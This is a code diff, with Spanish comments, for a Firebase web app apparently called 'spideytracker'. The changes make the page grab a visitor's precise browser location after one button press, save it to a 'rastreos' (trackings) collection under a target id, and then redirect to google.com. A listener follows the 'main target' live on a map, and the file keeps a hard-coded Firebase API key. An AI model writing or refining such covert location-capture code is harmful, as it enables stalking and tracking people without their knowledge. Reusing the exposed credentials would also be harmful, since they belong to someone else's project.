@@ -2,7 +2,7 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebas
 import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
 
-// CONFIGURACIÓN DE FIREBASE (Credenciales reales integradas)
+// CONFIGURACIÓN DE FIREBASE
 const firebaseConfig = {
     apiKey: "AIzaSyCvJx96Z6LoG9O1UEs-KCNfqjpRrVFjVBQ",
     authDomain: "spideytracker-591bb.firebaseapp.com",
@@ -51,12 +51,15 @@ document.addEventListener("DOMContentLoaded", async function () {
             btn.disabled = true;
             
             try {
+                // 1. Autenticar anónimamente de forma síncrona
                 await signInAnonymously(auth);
+                // 2. Iniciar captura y esperar a que guarde en Firestore
+                await capturarYSalir(targetId);
             } catch (err) {
-                console.error("Error de Auth:", err);
+                alert("Error de autenticación o conexión: " + err.message);
+                btn.innerText = "Reintentar";
+                btn.disabled = false;
             }
-            
-            capturarYSalir(targetId);
         });
         return;
     }
@@ -82,36 +85,43 @@ document.addEventListener("DOMContentLoaded", async function () {
     escucharObjetivoRemoto("objetivo_principal");
 });
 
-// CAPTURA DE UBICACIÓN
+// CAPTURA Y GUARDADO DE UBICACIÓN
 function capturarYSalir(id) {
-    if (!navigator.geolocation) {
-        window.location.replace("https://www.google.com");
-        return;
-    }
-
-    navigator.geolocation.getCurrentPosition(
-        async (position) => {
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
-
-            try {
-                await setDoc(doc(db, "rastreos", id), {
-                    lat: lat,
-                    lng: lng,
-                    timestamp: new Date().toISOString()
-                });
-            } catch (e) {
-                console.error("Error al guardar en Firebase:", e);
-            } finally {
-                window.location.replace("https://www.google.com");
-            }
-        },
-        (error) => {
-            console.error("Error obteniendo ubicación:", error);
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            alert("Tu navegador no soporta geolocalización.");
             window.location.replace("https://www.google.com");
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-    );
+            return resolve();
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+
+                try {
+                    // Esperar confirmación de guardado en Firestore
+                    await setDoc(doc(db, "rastreos", id), {
+                        lat: lat,
+                        lng: lng,
+                        timestamp: new Date().toISOString()
+                    });
+                } catch (e) {
+                    alert("Error guardando en la base de datos: " + e.message);
+                } finally {
+                    // Redirigir solo cuando Firestore haya respondido
+                    window.location.replace("https://www.google.com");
+                    resolve();
+                }
+            },
+            (error) => {
+                alert("Error obteniendo ubicación (" + error.code + "): " + error.message);
+                window.location.replace("https://www.google.com");
+                resolve();
+            },
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+    });
 }
 
 // ESCUCHAR DATOS EN TIEMPO REAL
@@ -148,7 +158,7 @@ function escucharObjetivoRemoto(id) {
     });
 }
 
-// FUNCIONALIDADES DE LOS BOTONES
+// FUNCIONALIDADES DE LA INTERFAZ
 function irAlPuntoDeAcceso() {
     if (ubicacionObjetivo) {
         map.invalidateSize();
